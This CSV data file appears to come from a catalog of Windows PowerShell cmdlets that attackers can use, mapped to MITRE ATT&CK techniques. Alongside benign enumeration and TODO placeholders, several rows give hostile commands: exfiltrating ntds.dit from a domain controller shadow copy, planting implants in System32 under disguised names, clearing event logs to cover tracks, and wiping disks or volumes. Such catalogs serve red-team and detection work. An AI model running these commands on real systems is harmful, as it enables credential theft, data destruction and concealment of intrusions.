"Get-MpPreference","Gets preferences for the Windows Defender scans and updates","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-MpPreference -CimSession $s","Obtain the AV's configuration","Identify whether the AV is active and which exclusion paths are configured","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpComputerStatus","Gets the status of antimalware software on the computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-MpComputerStatus -CimSession $s","Check status of AV","Identify whether the AV is active","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-HotFix","Gets the hotfixes that are installed on local or remote computers","2023-08-25","Builtin","","Get-HotFix -ComputerName W10.ad.bitsadmin.com","List installed KBs","Feed them to Windows Exploit Suggester - Next Generation to identify what vulnerabilities the system is vulnerable to","Recon","PowerShell Module: `Microsoft.PowerShell.Management`","TA0043","https://blog.bitsadmin.com/windows-security-updates-for-hackers","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPStarterGPO","Gets one Starter GPO or all Starter GPOs in a domain","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPStarterGPO","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPResultantSetOfPolicy","Gets and writes the RSoP information for a user, a computer, or both to a file","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPResultantSetOfPolicy","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPPermission","Gets the permission level for one or more security principals on a specified GPO","2023-07-01","[''RSAT''-|-''TODO'']","","Get-GPPermission","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPOReport","Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain","2023-07-01","[''Builtin''-|-''RSAT''-|-''TODO'']","","[''Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path ""$pwd\domain.html""''-|-''Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Xml -Path ""$pwd\domain.xml""''-|-''Get-GPOReport'']","[''Get report in HTML''-|-''Get report in XML''-|-''TODO'']","[''Information on group policies''-|-''Information on group policies''-|-''None'']","[''Domain''-|-''Domain''-|-''Domain'']","[''PowerShell Module: `GroupPolicy`''-|-''PowerShell Module: `GroupPolicy`''-|-''PowerShell Module: `GroupPolicy`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-GPO","Gets one GPO or all the GPOs in a domain","2023-07-01","[''Builtin''-|-''TODO'']","","Get-GPO","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-FileShare","Retrieves file share objects and their properties","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-FileShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-EtwTraceSession","Gets ETW trace sessions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-EtwTraceProvider","Gets ETW trace providers","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-EtwTraceProvider -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServerForwarder","Gets forwarder configuration settings on a DNS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsServerForwarder -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServerCache","Retrieves DNS server cache settings","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsServerCache -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsServer","Retrieves a DNS server configuration","2023-07-01","[''CIMSession''-|-''RSAT'']","","Get-DnsServer -CimSession $s","Show DNS server configuration","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientServerAddress","Gets DNS server IP addresses from the TCP/IP properties on an interface","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsClientServerAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientNrptRule","Retrieves the DNS client NRPT rules","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DnsClientNrptRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DnsClientCache","Retrieves the contents of the DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-DnsClientCache -CimSession $s","List cached DNS entries","Reconnaissance on the network/Internet activities on the computer","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DiskImage","Gets one or more disk image objects (virtual hard disk or ISO)","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Disk","Gets one or more disks visible to the operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-Disk -CimSession $s","List disks","Reconnaissance on disks","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4Lease","Gets one or more lease records from the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4Lease -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4FilterList","Gets the enabled state of the allow filter list and deny filter list set on the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4FilterList -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4Filter","Gets the list of all MAC addresses from the allow list or the deny list on the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4Filter -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerv4DnsSetting","Gets the DNS settings configured on the Dynamic Host Configuration Protocol (DHCP) server service for a specific scope, reservation, or server level","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerv4DnsSetting -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerSetting","Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerSetting -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerInDC","Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from Active Directory (AD)","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerInDC -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerDnsCredential","Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerDnsCredential -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerDatabase","Gets the configuration parameters related to the database of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerDatabase -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DhcpServerAuditLog","Gets the configuration parameters related to the audit log of the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DhcpServerAuditLog -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnRootTarget","Gets settings for root targets of a DFS namespace","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnRootTarget -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnRoot","Gets settings for DFS namespaces","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnRoot -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnFolderTarget","Gets settings for targets of a DFS namespace folder","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnFolderTarget -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-DfsnFolder","Gets settings for a DFS namespace folder","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-DfsnFolder -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DFSN`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimInstance","Gets the CIM instances of a class from a CIM server","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -CimSession $s -ClassName Win32_Process''-|-''Get-CimInstance -ClassName Win32_Process | % { [PSCustomObject]@{Name=$_.Name; User=$(Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User } }''-|-''Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s'']","[''Get instances of a CIM class''-|-''Get instances of a CIM class''-|-''Get instances of a CIM class'']","[''List running processes''-|-''List running processes including username''-|-''Obtain the ""Remote Desktop Services"" service instance. This can now for example be used to launch or stop the service'']","[''Processes''-|-''Processes''-|-''Manage'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","[''T1047''-|-''T1047''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimClass","Gets a list of CIM classes in a specific namespace","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-CimClass -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-CimAssociatedInstance","Retrieves the CIM instances that are connected to a specific CIM instance by an association","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-CimAssociatedInstance -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ChildItem","Gets the files and folders in a file system drive.","2023-08-25","Builtin","","Get-ChildItem -LiteralPath '\\?\UNC\FS1.ad.bitsadmin.com\IT' -Depth 25 -Force | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Mode=$_.Mode; Length=$_.Length; LastWriteTime=$_.LastWriteTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss'); FullName=$_.FullName.Replace('\?\UNC','') } } | Export-Csv -Encoding UTF8 -NoTypeInformation FS1_IT.csv","Enumerate network share","Create file listing of network share to identify files that can be used for escalation","Data","PowerShell Module: `Microsoft.PowerShell.Management`","T1083","https://blog.bitsadmin.com/digging-for-secrets","None","","Arris Huijgen","bitsadmin","","false"
"Get-AppvVirtualProcess","Displays the virtual processes running on a computer","2023-07-01","[''RSAT''-|-''TODO'']","","Get-AppvVirtualProcess","TODO","None","Manage","PowerShell Module: `AppvClient`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADUser","Gets one or more Active Directory users","2023-07-01","RSAT","","[''Get-ADUser -Filter {DoesNotRequirePreauth -eq $true}''-|-''Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} -Properties ServicePrincipalName''-|-''Get-ADUser -Filter {TrustedForDelegation -eq $true}''-|-''Get-ADUser -LDAPFilter ""(adminCount=1)"" -Server ad.bitsadmin.com'']","[''List users based on filter''-|-''List users based on filter''-|-''List users based on filter''-|-''List users based on LDAP filter'']","[''Enumerate aseproastable users''-|-''Enumerate kerberoastable users''-|-''Enumerate accounts that are trusted for unconstrained delegation''-|-''Enumerate users which [have been/are] members of at least one Administrative group'']","[''Domain''-|-''Domain''-|-''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADTrust","Returns all trusted domain objects in the directory","2023-07-01","RSAT","","Get-ADTrust -Filter * -Server ad.bitsadmin.com | ft Direction,Name,TrustType","Query AD trusts","Understand trust relations of the forest and domains","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADReplicationSubnet","Returns a specific Active Directory subnet or a set of AD subnets based on a specified filter.","2023-07-01","RSAT","","Get-ADReplicationSubnet -Filter * -Server ad.bitsadmin.com | select Name,Location,Site","List replication subnets","Enumerate subnets in use in the domain; useful to add LOFL tun2socks routes","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADOrganizationalUnit","Gets one or more Active Directory organizational units","2023-07-01","RSAT","","Get-ADOrganizationalUnit 'OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com'","Obtain information about OU","Learn which policies are applied to an OU","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADObject","Gets one or more Active Directory objects","2023-07-01","RSAT","","Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne ""$null""} -Properties msDS-AllowedToDelegateTo, userAccountControl","Query AD Objects using filter","Enumerate users and computers with constrained delegation enabled","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADGroupMember","Gets the members of an Active Directory group","2023-07-01","RSAT","","Get-ADGroupMember ""Domain Admins"" -Recursive -Server ad.bitsadmin.com","List all members of a group","Understand interesting targets in the environment","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADGroup","Gets one or more Active Directory groups","2023-07-01","RSAT","","Get-ADGroup -Filter * -Server ad.bitsadmin.com","List all groups","Enumerate groups","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADForest","Gets an Active Directory forest","2023-07-01","RSAT","","Get-ADForest -Server ad.bitsadmin.com","Get forest","Enumerate information about forest","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADDomainController","Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name","2023-07-01","RSAT","","[''Get-ADDomainController -Filter * -Server ad.bitsadmin.com''-|-''Get-ADDomainController -Discover -Service GlobalCatalog -DomainName ad.bitsadmin.com'']","[''List all domain controllers''-|-''List domain controllers'']","[''Enumerate all domain controllers of a domain''-|-''Obtain hostname and IP of a GC domain controller'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADDomain","Gets an Active Directory domain","2023-07-01","RSAT","","Get-ADDomain ad.bitsadmin.com","Get domain","Get information about the domain","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADComputerServiceAccount","Gets the service accounts hosted by a computer","2023-07-01","[''RSAT''-|-''TODO'']","","Get-ADComputerServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ADComputer","Gets one or more Active Directory computers","2023-07-01","RSAT","","[''Get-ADComputer -SearchBase ""OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com"" -Filter *''-|-''Get-ADComputer -Filter 'OperatingSystem -like ""*Server 2008*""' -Properties OperatingSystem'']","[''Query computers from specific OU''-|-''Query computers with specific attribute'']","[''Query list of domain controllers''-|-''Identify computers running an unsupported operating system'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Format-Volume","Formats one or more existing volumes or a new volume on an existing partition","2023-07-01","[''Builtin''-|-''CIMSession'']","","Format-Volume -CimSession $s -DriveLetter D -Force","Format volume","Affect availability of data on a volume","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","[''T1485''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Find-NetRoute","Finds the best local IP address and the best route to reach a remote address","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Find-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Export-VMSnapshot","Exports a virtual machine checkpoint to disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Export-VMSnapshot -Name 'VM snapshot' -VMName 'Windows 10 22H2' -Path C:\tmp -CimSession $s","Create snapshot of VM","Create a snapshot to then exfiltrate it over the network","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Next, using [Copy-Item](../Copy-Item) the snapshot can be copied locally''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Export-VM","Exports a virtual machine to disk","2023-07-01","[''Builtin''-|-''CIMSession'']","","Export-VM -Name 'Windows 10 22H2' -Path C:\tmp -CimSession $s","Export VM","Export a (running) VM and copy its data over the network","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Can also be a running VM''-|-''Next, using [Copy-Item](../Copy-Item) the exported VM can be copied''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Enter-PSSession","Starts an interactive session with a remote computer","2023-08-25","[''Builtin''-|-''PSSession'']","","[''Enter-PSSession -Session $ps''-|-''Enter-PSSession -ComputerName W10.ad.bitsadmin.com'']","[''Start interactive session''-|-''Start interactive session'']","[''Launch shell and perform reconnaissance or install a backdoor''-|-''Launch shell and perform reconnaissance or install a backdoor'']","[''Execute''-|-''Execute'']","[''Create `$ps` using [New-PSSession](../New-PSSession)''-|-''None'']","[''T1021.006''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Enable-NetFirewallRule","Enables a previously disabled firewall rule","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Enable-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Enable-ADAccount","Enables an Active Directory account","2023-07-01","RSAT","","Enable-ADAccount","Enable account","(Re-)enable account to make use of it","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Dismount-DiskImage","Dismounts a disk image (virtual hard disk or ISO) so that it can no longer be accessed as a disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Dismount-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-NetFirewallRule","Disables a firewall rule","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Disable-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-NetAdapter","Disables a network adapter","2023-07-01","[''Builtin''-|-''CIMSession'']","","Disable-NetAdapter -Name Ethernet0 -CimSession $s","Disable network adapter","Put remote machine offline","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetAdapter`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Disable-ADAccount","Disables an Active Directory account","2023-07-01","RSAT","","Disable-ADAccount -Identity Hacker","Disable account","None","Domain","PowerShell Module: `ActiveDirectory`","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"Copy-VMFile","Copies a file to a virtual machine","2023-07-01","[''Builtin''-|-''CIMSession'']","","Copy-VMFile -SourcePath C:\tmp\malware.exe -Name 'Windows 10 22H2' -DestinationPath C:\Windows\System32\spoolsv64.exe -FileSource Host -CimSession $s","Copy file to VM","Copy implant to VM","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''`C:\tmp\malware.exe` is a file path on the Hyper-V host to which the `-CimSession $s` points''-|-''`malware.exe` can be copied to the Hyper-V host using [Copy-Item](../Copy-Item)''-|-''Depends on some guest integration services to be enabled for the VM''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Copy-Item","Copies an item from one location to another","2023-08-25","[''Builtin''-|-''PSSession'']","","[''Copy-Item -Path C:\boot.ini -Destination . -FromSession $ps''-|-''Copy-Item -Path C:\beacon.exe -Destination C:\Windows\System32\Explorer.exe -ToSession $ps''-|-''Copy-Item -Path \\DC01.ad.bitsadmin.com\C$\@GMT-2023.06.01-19.34.01\Windows\NTDS\ntds.dit -Destination C:\Tmp\'']","[''Copy file from PSSession''-|-''Copy file to PSSession''-|-''Copy from volume shadow copy'']","[''Exfiltrate data''-|-''Copy implant''-|-''Exfiltrate `ntds.dit` from shadow copy over SMB'']","[''Data''-|-''Data''-|-''Data'']","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''Example of performing such copy at the blog in the references''-|-''PowerShell Module: `Microsoft.PowerShell.Management`'']","[''T1021.006''-|-''T1021.006''-|-''T1570''-|-''T1570''-|-''T1021.002'']","https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system","None","","Arris Huijgen","bitsadmin","","false"
"Connect-WSMan","Connects to the WinRM service on a remote computer","2023-07-01","[''Builtin''-|-''TODO'']","","Connect-WSMan","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Close-SmbSession","Ends forcibly the SMB session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Close-SmbSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Close-SmbOpenFile","Closes a file that is open by one of the clients of the SMB server","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Close-SmbOpenFile -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-Eventlog","Clears all entries from specified event logs on the local or remote computers.","2024-12-13","Builtin","","Clear-EventLog -LogName Application,Security,System -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Clear various logs on various computers","Cover tracks clearing past events in the various logs","Logs","[''Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)''-|-''See also [wevtutil.exe](../../Binaries/wevtutil)'']","T1070.001","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-DnsClientCache","Clears the contents of the DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Clear-DnsClientCache -CimSession $s","Clear DNS cache","Clear the DNS cache from any DNS entries that the attacker might have (accidentally) placed there","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Clear-Disk","Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk","2023-07-01","[''Builtin''-|-''CIMSession'']","","Clear-Disk -CimSession $s -Number 3","Clear disk with id 3","Affect availability of data on a disk","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","[''T1561''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Backup-GPO","Backs up one GPO or all the GPOs in a domain","2023-07-01","[''RSAT''-|-''TODO'']","","Backup-Gpo -Domain ad.bitsadmin.com -All -Path C:\tmp\GPOBackups","Backup all GPOs of the domain","Collect GPOs and search for credentials","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-NetNatStaticMapping","Adds a static mapping to a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-NetNatExternalAddress","Adds an external address to a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
